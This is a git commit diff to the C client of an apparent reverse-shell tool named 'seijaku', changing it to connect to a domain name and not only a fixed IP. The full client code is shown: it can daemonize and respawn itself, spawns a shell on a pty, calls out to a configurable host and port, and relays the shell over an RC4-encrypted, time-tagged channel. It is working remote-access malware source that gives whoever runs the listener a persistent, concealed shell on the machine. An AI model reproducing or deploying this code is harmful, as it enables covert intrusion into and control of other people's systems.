b5b01f27d35a7cbaf47de0ddfa132d2553ecb96f
Mix <32300164+mnixry@users.noreply.github.com>
2024-11-30 12:55:18 +0800

    Update client.c for domain connection support

--- src/seijaku/client/client.c
+++ src/seijaku/client/client.c
@@ -1,12 +1,13 @@
-#include <arpa/inet.h>
 #include <errno.h>
+#include <netdb.h>
 #include <pty.h>
-#include <signal.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/select.h>
+#include <sys/ioctl.h>
+#include <sys/param.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -17,7 +18,7 @@
 #endif
 
 #ifndef CONNECT_HOST
-#define CONNECT_HOST "127.0.0.1"
+#define CONNECT_HOST "localhost"
 #endif
 
 #ifndef CONNECT_PORT
@@ -32,65 +33,70 @@
 #define DAEMONIZE 0
 #endif
 
-#define BUFFER_LENGTH 1024
+#ifndef DEBUG_PRINT
+#define DEBUG_PRINT !DAEMONIZE
+#endif
+
+#define BUFFER_LENGTH 4096
 
 // Macros
-#define UINT64_TO_BIG_ENDIAN_ARRAY(x, arr)             \
-    {                                                  \
-        uint64_t _num = (x);                           \
-        if (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__) \
-            _num = __builtin_bswap64(_num);            \
-        memcpy((arr), &_num, sizeof(_num));            \
-    }
+#define UINT64_TO_BIG_ENDIAN_ARRAY(x, arr)                                     \
+  {                                                                            \
+    uint64_t _num = (x);                                                       \
+    if (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)                             \
+      _num = __builtin_bswap64(_num);                                          \
+    memcpy((arr), &_num, sizeof(_num));                                        \
+  }
 
-#define SWAP(a, b)     \
-    {                  \
-        __typeof(a) t; \
-        t = a;         \
-        a = b;         \
-        b = t;         \
-    }
+#define SWAP(a, b)                                                             \
+  {                                                                            \
+    __typeof(a) t;                                                             \
+    t = a;                                                                     \
+    a = b;                                                                     \
+    b = t;                                                                     \
+  }
 
-#define STRINGIZE_DETAIL(x) #x
-#define STRINGIZE(x) STRINGIZE_DETAIL(x)
-#define FATAL(msg)                                             \
-    {                                                          \
-        if (!DAEMONIZE)                                        \
-            perror(__FILE__ ":" STRINGIZE(__LINE__) ": " msg); \
-        exit(errno ? errno : 1);                               \
-    }
+#define _TO_STRING_DETAIL(x) #x
+#define _TO_STRING(x) _TO_STRING_DETAIL(x)
+#define PERROR(msg)                                                            \
+  {                                                                            \
+    if (DEBUG_PRINT)                                                           \
+      perror(__FILE__ ":" _TO_STRING(__LINE__) ": " msg);                      \
+  }
+#define FATAL(msg)                                                             \
+  {                                                                            \
+    PERROR(msg);                                                               \
+    exit(errno ? errno : EXIT_FAILURE);                                        \
+  }
 
-#define CHECK_ERROR(func_call)         \
-    ({                                 \
-        __auto_type ret = (func_call); \
-        if (ret < 0)                   \
-            FATAL(#func_call);         \
-        ret;                           \
-    })
+#define _ERROR_OP(func_call, fail_op)                                          \
+  ({                                                                           \
+    __auto_type ret = (func_call);                                             \
+    if (ret < 0)                                                               \
+      fail_op(#func_call);                                                     \
+    ret;                                                                       \
+  })
+#define ASSERT_ERROR(func_call) _ERROR_OP(func_call, FATAL)
+#define CHECK_ERROR(func_call) _ERROR_OP(func_call, PERROR)
 
-#define DEBUG_PROCESS_EXIT(status, msg)                     \
-    do                                                      \
-    {                                                       \
-        if (DAEMONIZE)                                      \
-            break;                                          \
-        if (WIFEXITED(status))                              \
-            fprintf(stderr, msg "with status %d\n",         \
-                    WEXITSTATUS(status));                   \
-        else if (WIFSIGNALED(status))                       \
-            fprintf(stderr, msg "with signal %d\n",         \
-                    WTERMSIG(status));                      \
-        else                                                \
-            fprintf(stderr, msg "with unknown status %d\n", \
-                    status);                                \
-    } while (0)
+#define DEBUG_PROCESS_EXIT(status, msg)                                        \
+  do {                                                                         \
+    if (!DEBUG_PRINT)                                                          \
+      break;                                                                   \
+    if (WIFEXITED(status))                                                     \
+      fprintf(stderr, msg "status=%d\n", WEXITSTATUS(status));                 \
+    else if (WIFSIGNALED(status))                                              \
+      fprintf(stderr, msg "signal=%s\n", strsignal(WTERMSIG(status)));         \
+    else                                                                       \
+      fprintf(stderr, msg "unknown status=%d\n", status);                      \
+  } while (0)
 
 #define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL
 
-typedef struct rc4_state
-{
-    uint8_t i;
-    uint8_t j;
-    uint8_t s[256];
+typedef struct rc4_state {
+  uint8_t i;
+  uint8_t j;
+  uint8_t s[256];
 } rc4_state;
 
 /**
@@ -99,18 +105,16 @@ typedef struct rc4_state
  * @param key key
  * @param keylen key length
  */
-void rc4_init(rc4_state *state, const char *key, int keylen)
-{
-    uint8_t j = 0;
-    for (int i = 0; i < 256; i++)
-        state->s[i] = i;
-    for (int i = 0; i < 256; i++)
-    {
-        j = (j + state->s[i] + key[i % keylen]) % 256;
-        SWAP(state->s[i], state->s[j]);
-    }
-    state->i = 0;
-    state->j = 0;
+void rc4_init(rc4_state *state, const char *key, int keylen) {
+  uint8_t j = 0;
+  for (int i = 0; i < 256; i++)
+    state->s[i] = i;
+  for (int i = 0; i < 256; i++) {
+    j = (j + state->s[i] + key[i % keylen]) % 256;
+    SWAP(state->s[i], state->s[j]);
+  }
+  state->i = 0;
+  state->j = 0;
 }
 
 /**
@@ -118,12 +122,11 @@ void rc4_init(rc4_state *state, const char *key, int keylen)
  * @param state RC4 state
  * @return next byte in the keystream
  */
-uint8_t rc4_next(rc4_state *state)
-{
-    state->i = (state->i + 1) % 256;
-    state->j = (state->j + state->s[state->i]) % 256;
-    SWAP(state->s[state->i], state->s[state->j]);
-    return state->s[(state->s[state->i] + state->s[state->j]) % 256];
+uint8_t rc4_next(rc4_state *state) {
+  state->i = (state->i + 1) % 256;
+  state->j = (state->j + state->s[state->i]) % 256;
+  SWAP(state->s[state->i], state->s[state->j]);
+  return state->s[(state->s[state->i] + state->s[state->j]) % 256];
 }
 
 /**
@@ -131,187 +134,206 @@ uint8_t rc4_next(rc4_state *state)
  * @param s input string
  * @return CRC64 hash
  */
-uint64_t crc64(const char *s)
-{
-    // Initialization value for the CRC (based on CRC64-ECMA)
-    uint64_t crc = 0;
-    size_t i, j;
+uint64_t crc64(const char *s) {
+  // Initialization value for the CRC (based on CRC64-ECMA)
+  uint64_t crc = 0;
+  size_t i, j;
 
-    // Process each byte of the string
-    for (i = 0; s[i] != '\0'; i++)
-    {
-        crc ^= (uint64_t)(unsigned char)s[i] << 56; // Integrate byte into the CRC
+  // Process each byte of the string
+  for (i = 0; s[i] != '\0'; i++) {
+    crc ^= (uint64_t)(unsigned char)s[i] << 56; // Integrate byte into the CRC
 
-        // Process each bit in the byte
-        for (j = 0; j < 8; j++)
-        {
-            if (crc & (1ULL << 63))
-            {
-                crc = (crc << 1) ^ CRC64_ECMA_182_POLY;
-            }
-            else
-            {
-                crc <<= 1;
-            }
-        }
+    // Process each bit in the byte
+    for (j = 0; j < 8; j++) {
+      if (crc & (1ULL << 63)) {
+        crc = (crc << 1) ^ CRC64_ECMA_182_POLY;
+      } else {
+        crc <<= 1;
+      }
     }
+  }
 
-    return crc;
+  return crc;
 }
 
-int main()
-{
-    pid_t pid;
+/**
+ * Connect to a host, host can be a domain name or an IP address
+ * @param host host to connect to
+ * @param port port to connect to
+ * @return socket file descriptor
+ */
+int connect_to_host(const char *host, int port) {
+  int sockfd = -1;
+  struct addrinfo hints = {0}, *res, *p;
+  hints.ai_family = AF_INET;
+  hints.ai_socktype = SOCK_STREAM;
+  char service[6];
+  snprintf(service, sizeof(service), "%d", port);
+  ASSERT_ERROR(getaddrinfo(host, service, &hints, &res));
+
+  for (p = res; p != NULL; p = p->ai_next) {
+    if ((sockfd = CHECK_ERROR(
+             socket(p->ai_family, p->ai_socktype, p->ai_protocol))) < 0)
+      continue;
+    if (CHECK_ERROR(connect(sockfd, p->ai_addr, p->ai_addrlen)) == 0)
+      break;
+    ASSERT_ERROR(close(sockfd));
+    sockfd = -1;
+  }
+
+  freeaddrinfo(res);
+  return sockfd;
+}
+
+/**
+ * Handle terminal resize control sequence
+ * @param master master side of the pty
+ * @param buffer buffer to handle
+ * @param n buffer length
+ * @return new buffer length
+ */
+size_t handle_resize(int master, char *buffer, size_t n) {
+  size_t write_len = n;
+  char *resize_start = memmem(buffer, n, "\x1b[8;", 4), *resize_end;
+  if (resize_start != NULL &&
+      (resize_end = memchr(resize_start, 't', n - (resize_start - buffer))) !=
+          NULL) {
+    resize_end++;
+    struct winsize ws;
+    int members =
+        sscanf(resize_start, "\x1b[8;%hd;%hdt", &ws.ws_row, &ws.ws_col);
+    if (members == 2) {
+      ASSERT_ERROR(ioctl(master, TIOCSWINSZ, &ws));
+      memmove(resize_start, resize_end, write_len - (resize_end - buffer));
+      write_len -= resize_end - resize_start;
+    }
+  }
+  return write_len;
+}
+
+int main() {
+  pid_t pid;
 
 #if DAEMONIZE
-    for (int i = 0; i < 2; i++)
-    {
-        pid = CHECK_ERROR(fork());
-        if (pid > 0)
-            return 0;
-    }
+  for (int i = 0; i < 2; i++) {
+    pid = ASSERT_ERROR(fork());
+    if (pid > 0)
+      return 0;
+  }
 #endif
 
-    for (;;)
-    {
-        pid = CHECK_ERROR(fork());
-        if (pid == 0)
-            break;
-
-        int status;
-        waitpid(pid, &status, 0);
-        DEBUG_PROCESS_EXIT(status, "Daemon child exited ");
-        sleep(1);
-    }
-
-    // Create a pty
-    int master, slave;
-    CHECK_ERROR(openpty(&master, &slave, NULL, NULL, NULL));
-
-    // Fork
-    pid = CHECK_ERROR(fork());
+  for (;;) {
+    pid = ASSERT_ERROR(fork());
     if (pid == 0)
-    {
-        // Child
-        // Close the master side of the pty
-        close(master);
+      break;
 
-        CHECK_ERROR(setsid());
-        CHECK_ERROR(ioctl(slave, TIOCSCTTY, 0));
+    int status;
+    waitpid(pid, &status, 0);
+    DEBUG_PROCESS_EXIT(status, "Daemon child exited ");
+    sleep(1);
+  }
 
-        CHECK_ERROR(dup2(slave, STDIN_FILENO));
-        CHECK_ERROR(dup2(slave, STDOUT_FILENO));
-        CHECK_ERROR(dup2(slave, STDERR_FILENO));
+  // Create a pty
+  int master, slave;
+  ASSERT_ERROR(openpty(&master, &slave, NULL, NULL, NULL));
 
-        // Execute a shell
-        CHECK_ERROR(execl(SHELL_COMMAND, SHELL_COMMAND, NULL));
-        return 0;
-    }
+  // Fork
+  pid = ASSERT_ERROR(fork());
+  if (pid == 0) {
+    // Child
+    // Close the master side of the pty
+    close(master);
 
-    // Parent
-    // Close the slave side of the pty
-    close(slave);
+    ASSERT_ERROR(setsid());
+    ASSERT_ERROR(ioctl(slave, TIOCSCTTY, 0));
 
-    // Create a socket
-    int sockfd = CHECK_ERROR(socket(AF_INET, SOCK_STREAM, 0));
+    ASSERT_ERROR(dup2(slave, STDIN_FILENO));
+    ASSERT_ERROR(dup2(slave, STDOUT_FILENO));
+    ASSERT_ERROR(dup2(slave, STDERR_FILENO));
 
-    // Specify an address to connect to
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(CONNECT_PORT);
-    addr.sin_addr.s_addr = inet_addr(CONNECT_HOST);
+    // Execute a shell
+    return ASSERT_ERROR(execl(SHELL_COMMAND, SHELL_COMMAND, NULL));
+  }
 
-    // Connect it
-    CHECK_ERROR(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)));
+  // Parent
+  // Close the slave side of the pty
+  close(slave);
 
-    // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
-    time_t tag_time = time(NULL);
-    char tag_string[sizeof(ENCRYPTION_KEY) + 16];
-    sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);
+  // Create a socket
+  int sockfd = ASSERT_ERROR(connect_to_host(CONNECT_HOST, CONNECT_PORT));
 
-    uint64_t tag = crc64(tag_string);
-    char tag_buf[sizeof(tag)];
-    UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);
+  // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
+  time_t tag_time = time(NULL);
+  char tag_string[sizeof(ENCRYPTION_KEY) + 16];
+  sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);
 
-    // mangle encryption key to ensure difference every time
-    char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
-    for (size_t i = 0; i < sizeof(ENCRYPTION_KEY); i++)
-        mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];
+  uint64_t tag = crc64(tag_string);
+  char tag_buf[sizeof(tag)];
+  UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);
 
-    // Send tag
-    CHECK_ERROR(send(sockfd, &tag_buf, sizeof(tag_buf), 0));
+  // mangle encryption key to ensure difference every time
+  char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
+  for (size_t i = 0; i < sizeof(ENCRYPTION_KEY); i++)
+    mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];
 
-    // Initialize RC4 states
-    rc4_state rc4recv, rc4send;
-    rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
-    rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
+  // Send tag
+  ASSERT_ERROR(send(sockfd, &tag_buf, sizeof(tag_buf), 0));
 
-    // Create duplex socket connection by polling
-    int fd_max = sockfd > master ? sockfd : master;
-    char buffer[BUFFER_LENGTH];
+  // Initialize RC4 states
+  rc4_state rc4recv, rc4send;
+  rc4_init(&rc4recv, mangled_encryption_key,
+           sizeof(mangled_encryption_key) - 1);
+  rc4_init(&rc4send, mangled_encryption_key,
+           sizeof(mangled_encryption_key) - 1);
 
-    for (;;)
-    {
-        fd_set readfds;
-        FD_ZERO(&readfds);
-        FD_SET(sockfd, &readfds);
-        FD_SET(master, &readfds);
+  // Create duplex socket connection by polling
+  int fd_max = MAX(sockfd, master);
+  char buffer[BUFFER_LENGTH];
 
-        CHECK_ERROR(select(fd_max + 1, &readfds, NULL, NULL, NULL));
+  for (;;) {
+    fd_set readfds;
+    FD_ZERO(&readfds);
+    FD_SET(sockfd, &readfds);
+    FD_SET(master, &readfds);
 
-        ssize_t n;
-        // Read from socket and write to pty
-        if (FD_ISSET(sockfd, &readfds))
-            for (;;)
-            {
-                n = CHECK_ERROR(recv(sockfd, buffer, sizeof(buffer), 0));
-                if (n == 0)
-                    goto end_loop;
-                for (ssize_t i = 0; i < n; i++)
-                    buffer[i] ^= rc4_next(&rc4recv);
+    ASSERT_ERROR(select(fd_max + 1, &readfds, NULL, NULL, NULL));
 
-                // Check if resize TTY sequence is received
-                size_t write_len = n;
-                char *resize_start = memmem(buffer, n, "\x1b[8;", 4),
-                     *resize_end;
-                if (resize_start != NULL &&
-                    (resize_end = memchr(resize_start, 't', n - (resize_start - buffer))) != NULL)
-                {
-                    resize_end++;
-                    struct winsize ws;
-                    int members = sscanf(resize_start, "\x1b[8;%hd;%hdt", &ws.ws_row, &ws.ws_col);
-                    if (members == 2)
-                    {
-                        CHECK_ERROR(ioctl(master, TIOCSWINSZ, &ws));
-                        memmove(resize_start, resize_end, write_len - (resize_end - buffer));
-                        write_len -= resize_end - resize_start;
-                    }
-                }
-                CHECK_ERROR(write(master, buffer, write_len));
+    size_t n;
+    // Read from socket and write to pty
+    if (FD_ISSET(sockfd, &readfds))
+      for (;;) {
+        n = ASSERT_ERROR(recv(sockfd, buffer, sizeof(buffer), 0));
+        if (n == 0)
+          goto end_loop;
+        for (size_t i = 0; i < n; i++)
+          buffer[i] ^= rc4_next(&rc4recv);
 
-                // Break if the buffer is not full (i.e., no more data to read)
-                if ((size_t)n < sizeof(buffer))
-                    break;
-            }
+        // Check if resize TTY sequence is received
+        size_t write_len = handle_resize(master, buffer, n);
+        ASSERT_ERROR(write(master, buffer, write_len));
 
-        // Read from pty and write to socket
-        if (FD_ISSET(master, &readfds))
-            for (;;)
-            {
-                n = CHECK_ERROR(read(master, buffer, sizeof(buffer)));
-                if (n == 0)
-                    goto end_loop;
-                for (ssize_t i = 0; i < n; i++)
-                    buffer[i] ^= rc4_next(&rc4send);
-                CHECK_ERROR(send(sockfd, buffer, n, 0));
-                if ((size_t)n < sizeof(buffer))
-                    break;
-            }
-    }
+        // Break if the buffer is not full (i.e., no more data to read)
+        if (n < sizeof(buffer))
+          break;
+      }
+
+    // Read from pty and write to socket
+    if (FD_ISSET(master, &readfds))
+      for (;;) {
+        n = ASSERT_ERROR(read(master, buffer, sizeof(buffer)));
+        if (n == 0)
+          goto end_loop;
+        for (size_t i = 0; i < n; i++)
+          buffer[i] ^= rc4_next(&rc4send);
+        ASSERT_ERROR(send(sockfd, buffer, n, 0));
+        if (n < sizeof(buffer))
+          break;
+      }
+  }
 
 end_loop:
-    kill(-pid, SIGTERM);
-    shutdown(sockfd, SHUT_WR);
-    close(master);
-    return 0;
+  kill(-pid, SIGTERM);
+  shutdown(sockfd, SHUT_WR);
+  close(master);
+  return 0;
 }
